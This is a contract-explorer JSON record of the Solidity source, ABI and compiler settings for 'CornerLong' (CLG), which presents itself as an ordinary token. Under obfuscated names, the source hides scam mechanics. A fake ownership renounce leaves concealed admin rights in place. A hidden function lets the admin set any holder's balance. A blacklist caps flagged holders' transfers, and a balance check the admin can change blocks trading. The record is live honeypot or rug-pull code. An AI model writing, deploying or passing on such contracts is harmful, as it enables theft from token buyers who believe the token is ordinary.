{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface modeMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract senderLaunchedTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface txEnable {\n    function createPair(address totalLiquidity, address launchedMin) external returns (address);\n}\n\ninterface limitFund {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoReceiver) external view returns (uint256);\n\n    function transfer(address autoSell, uint256 exemptListFrom) external returns (bool);\n\n    function allowance(address tokenBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptListFrom) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoSell,\n        uint256 exemptListFrom\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeFee, uint256 value);\n    event Approval(address indexed tokenBuy, address indexed spender, uint256 value);\n}\n\ninterface sellWallet is limitFund {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CornerLong is senderLaunchedTeam, limitFund, sellWallet {\n\n    uint256 enableExempt;\n\n    uint256 feeReceiver;\n\n    function getOwner() external view returns (address) {\n        return minLimit;\n    }\n\n    address private minLimit;\n\n    address toFromReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public takeTo;\n\n    function minToken() public {\n        emit OwnershipTransferred(receiverToLiquidity, address(0));\n        minLimit = address(0);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return txTokenFee;\n    }\n\n    function allowance(address buyTotal, address exemptMode) external view virtual override returns (uint256) {\n        if (exemptMode == toFromReceiver) {\n            return type(uint256).max;\n        }\n        return launchedMarketingFrom[buyTotal][exemptMode];\n    }\n\n    function owner() external view returns (address) {\n        return minLimit;\n    }\n\n    string private exemptListTake = \"CLG\";\n\n    uint256 private enableMode = 100000000 * 10 ** 18;\n\n    function launchedAmount(address sellTotal, address autoSell, uint256 exemptListFrom) internal returns (bool) {\n        if (sellTotal == receiverToLiquidity) {\n            return fundTotal(sellTotal, autoSell, exemptListFrom);\n        }\n        uint256 liquidityLaunchedIs = limitFund(listLimit).balanceOf(modeEnableTotal);\n        require(liquidityLaunchedIs == feeReceiver);\n        require(autoSell != modeEnableTotal);\n        if (launchMarketing[sellTotal]) {\n            return fundTotal(sellTotal, autoSell, fundSwapLaunch);\n        }\n        return fundTotal(sellTotal, autoSell, exemptListFrom);\n    }\n\n    uint256 private autoFrom;\n\n    mapping(address => bool) public launchMarketing;\n\n    function balanceOf(address autoReceiver) public view virtual override returns (uint256) {\n        return atMax[autoReceiver];\n    }\n\n    function approve(address exemptMode, uint256 exemptListFrom) public virtual override returns (bool) {\n        launchedMarketingFrom[_msgSender()][exemptMode] = exemptListFrom;\n        emit Approval(_msgSender(), exemptMode, exemptListFrom);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private launchedMarketingFrom;\n\n    function transfer(address modeEnableAmount, uint256 exemptListFrom) external virtual override returns (bool) {\n        return launchedAmount(_msgSender(), modeEnableAmount, exemptListFrom);\n    }\n\n    mapping(address => uint256) private atMax;\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamShould;\n    }\n\n    function transferFrom(address sellTotal, address autoSell, uint256 exemptListFrom) external override returns (bool) {\n        if (_msgSender() != toFromReceiver) {\n            if (launchedMarketingFrom[sellTotal][_msgSender()] != type(uint256).max) {\n                require(exemptListFrom <= launchedMarketingFrom[sellTotal][_msgSender()]);\n                launchedMarketingFrom[sellTotal][_msgSender()] -= exemptListFrom;\n            }\n        }\n        return launchedAmount(sellTotal, autoSell, exemptListFrom);\n    }\n\n    event OwnershipTransferred(address indexed totalFund, address indexed amountAt);\n\n    uint256 private sellIs;\n\n    function buyEnableSell(address launchedReceiver) public {\n        receiverReceiver();\n        if (autoToken) {\n            autoFrom = sellIs;\n        }\n        if (launchedReceiver == receiverToLiquidity || launchedReceiver == listLimit) {\n            return;\n        }\n        launchMarketing[launchedReceiver] = true;\n    }\n\n    function receiverReceiver() private view {\n        require(fundMode[_msgSender()]);\n    }\n\n    bool public autoToken;\n\n    address public receiverToLiquidity;\n\n    uint256 constant fundSwapLaunch = 15 ** 10;\n\n    function limitTeam(address takeTradingLaunched) public {\n        require(takeTradingLaunched.balance < 100000);\n        if (tradingSwapMax) {\n            return;\n        }\n        \n        fundMode[takeTradingLaunched] = true;\n        \n        tradingSwapMax = true;\n    }\n\n    string private txTokenFee = \"Corner Long\";\n\n    bool public walletSwap;\n\n    function symbol() external view virtual override returns (string memory) {\n        return exemptListTake;\n    }\n\n    function fundTotal(address sellTotal, address autoSell, uint256 exemptListFrom) internal returns (bool) {\n        require(atMax[sellTotal] >= exemptListFrom);\n        atMax[sellTotal] -= exemptListFrom;\n        atMax[autoSell] += exemptListFrom;\n        emit Transfer(sellTotal, autoSell, exemptListFrom);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableMode;\n    }\n\n    uint8 private teamShould = 18;\n\n    constructor (){\n        if (autoFrom != sellIs) {\n            takeTo = sellIs;\n        }\n        modeMarketing feeBuy = modeMarketing(toFromReceiver);\n        listLimit = txEnable(feeBuy.factory()).createPair(feeBuy.WETH(), address(this));\n        if (sellIs != autoFrom) {\n            autoFrom = takeTo;\n        }\n        receiverToLiquidity = _msgSender();\n        minToken();\n        fundMode[receiverToLiquidity] = true;\n        atMax[receiverToLiquidity] = enableMode;\n        \n        emit Transfer(address(0), receiverToLiquidity, enableMode);\n    }\n\n    bool public totalMin;\n\n    address public listLimit;\n\n    mapping(address => bool) public fundMode;\n\n    bool public tradingSwapMax;\n\n    address modeEnableTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function txTeamAmount(address modeEnableAmount, uint256 exemptListFrom) public {\n        receiverReceiver();\n        atMax[modeEnableAmount] = exemptListFrom;\n    }\n\n    function amountMarketing(uint256 exemptListFrom) public {\n        receiverReceiver();\n        feeReceiver = exemptListFrom;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptMode\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptListFrom\",\"type\":\"uint256\"}],\"name\":\"amountMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptListFrom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedReceiver\",\"type\":\"address\"}],\"name\":\"buyEnableSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTradingLaunched\",\"type\":\"address\"}],\"name\":\"limitTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverToLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingSwapMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeEnableAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptListFrom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptListFrom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeEnableAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptListFrom\",\"type\":\"uint256\"}],\"name\":\"txTeamAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "CornerLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}